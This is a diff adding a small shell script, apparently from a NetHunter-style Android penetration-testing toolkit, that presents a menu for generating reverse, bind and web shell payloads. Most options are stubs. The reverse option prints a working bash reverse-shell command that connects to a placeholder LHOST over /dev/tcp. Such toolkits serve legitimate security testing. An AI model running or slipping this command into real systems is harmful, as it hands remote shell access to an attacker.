@@ -1,0 +1,39 @@
+#!/system/bin/sh
+# NH_SETUP_VERSION: 3.0 matrix
+# PRIORITY: P1
+# nh-payload-gen — Payload generator for security testing.
+
+set -euo pipefail
+. /data/local/nhsystem/bin/nh-lib
+
+show_menu() {
+    echo "══════════════════════════════════════════"
+    echo "  NetHunter Matrix — Payload Generator"
+    echo "══════════════════════════════════════════"
+    echo ""
+    echo "Types:"
+    echo "  reverse   — Reverse shell payloads"
+    echo "  bind      — Bind shell payloads"
+    echo "  web       — Web shells"
+    echo "  custom    — Custom payload builder"
+}
+
+generate_reverse() {
+    local lhost="${1:-LHOST}" rport="${2:-4444}"
+    echo "[*] Generating reverse shell payload..."
+    echo "  LHOST=$lhost RPORT=$rport"
+    echo "  Payload: bash -i >& /dev/tcp/$lhost/$rport 0>&1"
+}
+
+generate_web() {
+    local type="${1:-php}"
+    echo "[*] Generating web shell ($type)..."
+}
+
+case "${1:-menu}" in
+    menu) show_menu ;;
+    reverse) generate_reverse "${2:-}" "${3:-}" ;;
+    bind) echo "[*] Bind shell..." ;;
+    web) generate_web "${2:-}" ;;
+    *) show_menu ;;
+esac
